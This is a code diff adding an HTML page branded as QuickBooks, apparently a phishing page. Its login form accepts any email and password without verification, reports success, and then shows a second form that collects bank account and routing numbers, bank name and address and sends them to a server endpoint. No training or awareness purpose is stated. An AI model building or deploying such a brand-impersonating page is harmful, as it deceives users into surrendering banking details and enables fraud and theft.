@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>QuickBooks Payments Flow</title>
+    <style>
+      :root {
+        --bg: #f4f7fb;
+        --card: #ffffff;
+        --primary: #1c7ae8;
+        --primary-dark: #1358b6;
+        --text: #1f2937;
+        --muted: #6b7280;
+        --border: #dfe7f1;
+        --success: #0d8f5a;
+        --success-bg: #eafaf3;
+        --danger: #d93025;
+        --danger-bg: #fdecec;
+        --shadow: 0 12px 32px rgba(15, 23, 42, 0.08);
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: linear-gradient(135deg, #edf5ff 0%, #f8fafc 100%);
+        color: var(--text);
+      }
+
+      .container {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px;
+      }
+
+      .card {
+        width: 100%;
+        max-width: 960px;
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 22px;
+        box-shadow: var(--shadow);
+        overflow: hidden;
+      }
+
+      .grid {
+        display: grid;
+        grid-template-columns: 1fr 1.2fr;
+      }
+
+      .left-panel {
+        background: linear-gradient(160deg, #0f172a, #1d4ed8);
+        color: #fff;
+        padding: 48px 32px;
+      }
+
+      .brand {
+        font-size: 2rem;
+        font-weight: 700;
+        letter-spacing: 0.04em;
+        margin-bottom: 18px;
+      }
+
+      .tag {
+        display: inline-block;
+        padding: 8px 12px;
+        border-radius: 999px;
+        background: rgba(255,255,255,0.12);
+        border: 1px solid rgba(255,255,255,0.15);
+        font-size: 12px;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        margin-bottom: 18px;
+      }
+
+      .left-panel h2 {
+        margin: 0 0 12px;
+        font-size: 2rem;
+      }
+
+      .left-panel p {
+        line-height: 1.7;
+        color: rgba(255,255,255,0.8);
+        margin: 0;
+      }
+
+      .right-panel {
+        padding: 32px 28px;
+      }
+
+      .hidden {
+        display: none !important;
+      }
+
+      .form-title {
+        font-size: 1.75rem;
+        margin: 0 0 6px;
+        font-weight: 700;
+      }
+
+      .subtext {
+        color: var(--muted);
+        margin: 0 0 24px;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        gap: 18px;
+      }
+
+      .field {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      label {
+        font-size: 0.92rem;
+        font-weight: 600;
+        color: var(--text);
+      }
+
+      input {
+        width: 100%;
+        border: 1px solid var(--border);
+        background: #f8fafc;
+        border-radius: 12px;
+        padding: 14px 16px;
+        font-size: 1rem;
+        outline: none;
+        transition: 0.2s ease;
+      }
+
+      input:focus {
+        border-color: var(--primary);
+        box-shadow: 0 0 0 3px rgba(28, 122, 232, 0.12);
+      }
+
+      .row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+      }
+
+      .btn {
+        padding: 14px 18px;
+        border: none;
+        border-radius: 12px;
+        background: var(--primary);
+        color: white;
+        font-size: 1rem;
+        font-weight: 700;
+        cursor: pointer;
+        transition: 0.2s ease;
+      }
+
+      .btn:hover {
+        background: var(--primary-dark);
+      }
+
+      .secondary {
+        background: #eaf2ff;
+        color: var(--primary-dark);
+      }
+
+      .message {
+        margin-top: 18px;
+        border-radius: 12px;
+        padding: 14px 16px;
+        font-size: 0.96rem;
+        display: none;
+      }
+
+      .message.success {
+        display: block;
+        background: var(--success-bg);
+        color: var(--success);
+        border: 1px solid rgba(16, 143, 90, 0.2);
+      }
+
+      .message.error {
+        display: block;
+        background: var(--danger-bg);
+        color: var(--danger);
+        border: 1px solid rgba(217, 48, 37, 0.2);
+      }
+
+      .result-box {
+        margin-top: 18px;
+        padding: 18px;
+        border-radius: 14px;
+        background: #f8fafc;
+        border: 1px solid var(--border);
+        display: none;
+      }
+
+      .result-box.visible {
+        display: block;
+      }
+
+      .result-box pre {
+        margin: 0;
+        white-space: pre-wrap;
+        word-break: break-word;
+        font-size: 0.84rem;
+        line-height: 1.6;
+      }
+
+      @media (max-width: 700px) {
+        .grid {
+          grid-template-columns: 1fr;
+        }
+        .row {
+          grid-template-columns: 1fr;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <div class="grid">
+          <div class="left-panel">
+            <div class="tag">Secure payments</div>
+            <div class="brand">QuickBooks</div>
+            <h2>Access your payment dashboard</h2>
+            <p>
+              Manage your login, verify account details, and complete secure
+              bank information for processing payments safely.
+            </p>
+          </div>
+
+          <div class="right-panel">
+            <section id="loginSection">
+              <h1 class="form-title">Login</h1>
+              <p class="subtext">Use your company email and password to continue.</p>
+
+              <form id="loginForm">
+                <div class="field">
+                  <div>
+                    <label for="email">Email</label>
+                  </div>
+                  <input id="email" name="email" type="email" placeholder="you@company.com" required />
+                </div>
+
+                <div class="field">
+                  <div>
+                    <label for="password">Password</label>
+                  </div>
+                  <input id="password" name="password" type="password" placeholder="••••••••" required />
+                </div>
+
+                <button type="submit" class="btn">Log In</button>
+              </form>
+
+              <div id="loginMessage" class="message"></div>
+            </section>
+
+            <section id="bankSection" class="hidden">
+              <h1 class="form-title">Bank details</h1>
+              <p class="subtext">Complete your bank account information for payment processing.</p>
+
+              <form id="bankForm">
+                <div class="field">
+                  <label for="accountNumber">Account Number</label>
+                  <input id="accountNumber" name="accountNumber" placeholder="123456789012" required />
+                </div>
+
+                <div class="row">
+                  <div class="field">
+                    <label for="routingNumber">Routing Number</label>
+                    <input id="routingNumber" name="routingNumber" placeholder="021000021" required />
+                  </div>
+
+                  <div class="field">
+                    <label for="bankName">Bank Name</label>
+                    <input id="bankName" name="bankName" placeholder="Chase Bank" required />
+                  </div>
+                </div>
+
+                <div class="field">
+                  <label for="bankAddress">Bank Address</label>
+                  <input id="bankAddress" name="bankAddress" placeholder="270 Park Ave, New York, NY" required />
+                </div>
+
+                <button type="submit" class="btn">Submit Bank Details</button>
+              </form>
+
+              <div id="bankMessage" class="message"></div>
+
+              <div id="resultBox" class="result-box">
+                <pre id="resultOutput"></pre>
+              </div>
+            </section>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const loginSection = document.getElementById('loginSection');
+      const bankSection = document.getElementById('bankSection');
+      const loginForm = document.getElementById('loginForm');
+      const bankForm = document.getElementById('bankForm');
+      const loginMessage = document.getElementById('loginMessage');
+      const bankMessage = document.getElementById('bankMessage');
+      const resultBox = document.getElementById('resultBox');
+      const resultOutput = document.getElementById('resultOutput');
+
+      function showMessage(el, type, text) {
+        el.className = 'message ' + type;
+        el.textContent = text;
+        el.style.display = 'block';
+      }
+
+      function hideMessage(el) {
+        el.className = 'message';
+        el.textContent = '';
+      }
+
+      function showBankSection() {
+        loginSection.classList.add('hidden');
+        bankSection.classList.remove('hidden');
+      }
+
+      loginForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!email || !password) {
+          showMessage(loginMessage, 'error', 'Please enter both email and password.');
+          return;
+        }
+
+        showMessage(loginMessage, 'success', 'Login successful. Redirecting to bank setup...');
+        setTimeout(() => {
+          showBankSection();
+          hideMessage(loginMessage);
+        }, 900);
+      });
+
+      bankForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        const data = {
+          accountNumber: document.getElementById('accountNumber').value,
+          routingNumber: document.getElementById('routingNumber').value,
+          bankName: document.getElementById('bankName').value,
+          bankAddress: document.getElementById('bankAddress').value
+        };
+
+        if (!data.accountNumber || !data.routingNumber || !data.bankName || !data.bankAddress) {
+          showMessage(bankMessage, 'error', 'Please fill in all bank fields.');
+          return;
+        }
+
+        try {
+          const response = await fetch('/api/payments/bank-details/complete', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+
+          const result = await response.json();
+
+          if (!response.ok) {
+            throw new Error(result.error || 'Bank details submission failed.');
+          }
+
+          showMessage(bankMessage, 'success', 'Bank details submitted successfully.');
+          resultBox.classList.add('visible');
+          resultOutput.textContent = JSON.stringify(result, null, 2);
+        } catch (error) {
+          showMessage(bankMessage, 'error', error.message || 'Bank details submission failed.');
+        }
+      });
+    </script>
+  </body>
+</html>
